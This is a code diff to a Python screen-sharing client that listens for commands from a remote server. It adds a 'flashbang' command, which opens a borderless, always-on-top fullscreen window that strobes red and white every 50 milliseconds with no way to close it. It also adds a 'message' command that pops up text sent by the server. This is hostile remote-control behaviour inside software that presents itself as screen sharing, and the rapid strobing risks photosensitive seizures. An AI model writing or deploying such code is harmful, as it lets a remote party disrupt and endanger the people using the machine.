@@ -5,6 +5,10 @@ import io
 import threading
 import time
 import platform
+import tkinter as tk
+import tkinter.font as Font
+from tkinter import ttk
+from tkinter import messagebox as messagebox
 
 class ScreenSharingClient:
     def __init__(self, server_ip='ENDOSPC', server_port=5001):
@@ -51,6 +55,26 @@ class ScreenSharingClient:
         try:
             while True:
                 command = self.client_socket.recv(1024).decode('utf-8')
+                if command.lower() == "flashbang":
+                    print("flashbang command recieved successfully")
+                    error_box = tk.Tk()
+                    black = "#ff0000"
+                    white = "#ffffff"
+                    error_box.configure(bg=black)
+                    error_box.attributes("-topmost", True)
+                    error_box.attributes("-fullscreen", True)
+                    error_box.overrideredirect(True)
+                    error_box.resizable(False, False)
+                    def swap_colors():
+                        nonlocal black, white
+                        black, white = white, black
+                        error_box.configure(bg=black)
+                        error_box.after(50, swap_colors)
+                    swap_colors()
+                    error_box.mainloop()
+                elif command.startswith("message"):
+                    message = command[7:]
+                    messagebox.showinfo(title="You got a Message", message=message)
         except Exception as e:
             print(f"Error receiving commands: {e}")
             self.client_socket.close()
